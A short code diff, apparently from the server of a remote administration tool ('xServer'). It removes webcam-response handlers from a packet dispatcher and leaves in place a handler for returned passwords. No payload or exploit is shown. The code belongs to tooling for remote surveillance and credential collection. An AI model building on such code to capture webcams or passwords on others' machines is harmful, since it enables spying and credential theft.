@@ -20,14 +20,6 @@ namespace xServer.Core.Networking
             {
                 CommandHandler.HandleSetUserStatus(client, (SetUserStatus)packet);
             }
-            else if (type == typeof(GetWebcamsResponse))
-            {
-                CommandHandler.HandleGetWebcamsResponse(client, (GetWebcamsResponse)packet);
-            }
-            else if (type == typeof(GetWebcamResponse))
-            {
-                CommandHandler.HandleGetWebcamResponse(client, (GetWebcamResponse)packet);
-            }
             else if (type == typeof(GetPasswordsResponse))
             {
                 CommandHandler.HandleGetPasswordsResponse(client, (GetPasswordsResponse)packet);
